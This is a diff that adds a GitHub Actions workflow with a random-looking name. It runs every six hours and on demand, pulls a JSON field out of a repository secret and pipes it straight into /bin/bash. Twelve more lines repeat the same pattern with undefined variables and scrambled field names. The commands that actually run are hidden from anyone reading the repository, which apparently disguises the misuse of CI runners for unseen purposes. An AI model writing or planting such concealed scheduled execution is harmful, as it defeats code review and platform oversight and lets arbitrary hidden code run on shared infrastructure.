@@ -1,0 +1,31 @@
+name: vocalistjabber
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '16 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: vocalistjabber
+        env:
+          rk4: ${{ secrets.rk4 }}
+        run: |
+          echo $rk4 | jq -r .l1257 | /bin/bash
+          echo $rkwap678 | jq -r .hzdj49 | /bin/bash
+          echo $tpr6 | jq -r .mzbi7 | /bin/bash
+          echo $roivo03585 | jq -r .ycill30 | /bin/bash
+          echo $dhslu5945 | jq -r .aju58 | /bin/bash
+          echo $tmh6234 | jq -r .supa5 | /bin/bash
+          echo $xcj139 | jq -r .v9 | /bin/bash
+          echo $axqo51 | jq -r .xmiu357 | /bin/bash
+          echo $orp29352 | jq -r .t049 | /bin/bash
+          echo $o7 | jq -r .brrb7384 | /bin/bash
+          echo $r23 | jq -r .sb500 | /bin/bash
+          echo $ymi3681 | jq -r .q60297 | /bin/bash
+          echo $im1066 | jq -r .rfuyr23485 | /bin/bash
+
